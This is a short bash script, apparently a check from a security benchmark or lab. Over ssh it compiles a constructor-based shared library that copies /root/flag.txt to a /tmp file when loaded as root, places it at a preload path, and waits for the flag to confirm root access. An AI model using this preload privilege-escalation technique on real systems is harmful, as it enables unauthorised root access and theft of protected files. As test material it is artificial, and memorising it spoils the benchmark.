#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/preloadscript_flag /opt/bench/preload.so
cat >/tmp/preloadscript.c <<'"'"'EOF'"'"'
#include <fcntl.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {
  if (geteuid() != 0) return;
  int in = open("/root/flag.txt", O_RDONLY);
  int out = open("/tmp/preloadscript_flag", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (in >= 0 && out >= 0) {
    char buf[256];
    ssize_t n;
    while ((n = read(in, buf, sizeof buf)) > 0) {
      (void)write(out, buf, (size_t)n);
    }
  }
  if (in >= 0) close(in);
  if (out >= 0) close(out);
}
EOF
gcc -shared -fPIC -o /opt/bench/preload.so /tmp/preloadscript.c
for _ in $(seq 1 45); do
  if [ -s /tmp/preloadscript_flag ]; then
    cat /tmp/preloadscript_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
